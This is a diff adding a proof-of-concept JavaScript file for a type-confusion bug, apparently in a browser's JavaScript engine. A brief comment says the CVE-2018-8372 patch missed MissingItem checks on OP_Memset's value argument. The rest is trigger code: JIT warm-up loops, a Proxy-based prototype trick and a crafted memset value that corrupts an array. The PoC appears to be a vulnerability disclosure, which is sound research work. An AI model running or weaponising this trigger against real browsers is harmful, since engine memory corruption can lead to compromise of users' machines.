@@ -1,0 +1,45 @@
+/*
+Since the patch for CVE-2018-8372, it checks all inputs to native arrays, and if any input equals to the MissingItem value which can cause type confusion, it starts the bailout process. But it doesn't check the "value" argument to OP_Memset. This can be exploited in the same way as for   issue 1581  .
+
+PoC:
+*/
+
+function memset(arr, value, n) {
+    for (let i = 0; i < n; i++) {
+        arr[i] = value;
+    }
+}
+
+function trigger(arr, buggy) {
+    let tmp = [1];
+
+    arr.length;
+
+    let res = tmp.concat(buggy);
+    arr[0] = 0x1234;
+    arr[1] = 0;
+}
+
+function main() {
+    let tmp = (new Array(100)).fill(1);
+    for (let i = 0; i < 500; i++) {
+        memset(tmp, 1, tmp.length);
+        trigger(tmp, [1]);
+    }
+
+    setTimeout(() => {
+        let buggy = [1];
+        let arr = [1, 2];
+
+        arr.getPrototypeOf = Object.prototype.valueOf;
+
+        buggy.__proto__ = new Proxy({}, arr);
+
+        memset(buggy, -524286, 1);
+        trigger(arr, buggy);
+
+        alert(arr);
+    }, 100);
+}
+
+main();
